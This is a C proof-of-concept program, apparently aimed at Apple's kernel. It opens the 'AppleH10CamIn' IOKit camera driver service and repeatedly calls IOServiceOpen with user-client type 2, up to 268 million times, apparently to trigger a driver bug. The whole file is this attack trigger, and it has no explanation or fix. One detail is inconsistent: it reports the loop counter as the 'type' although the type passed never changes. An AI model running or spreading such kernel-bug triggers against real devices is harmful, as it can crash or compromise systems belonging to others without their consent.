#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <mach/mach.h>
#include "iokit.h"

void poc(void) {
    kern_return_t err;
    io_connect_t shared_user_client_conn = MACH_PORT_NULL;
    
    io_service_t io_service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("AppleH10CamIn"));
        
    if (io_service == MACH_PORT_NULL) {
        perror("Failed to get service port\n");
        return;
    }

    printf("got service: 0x%x\n", io_service);
    
    for (size_t i = 0; i < 0x10000000; ++i) {
            
        err = IOServiceOpen(io_service, mach_task_self(), 2, &shared_user_client_conn);
        if(err == KERN_SUCCESS) {
            printf("cool! type == 0x%zx\n", i);
            return;
        }
    }
    printf("done\n");
    return;
}

int main(int argc, char *argv[]) {
	printf("[*] start poc\n");
	poc();	
	return 0;
}
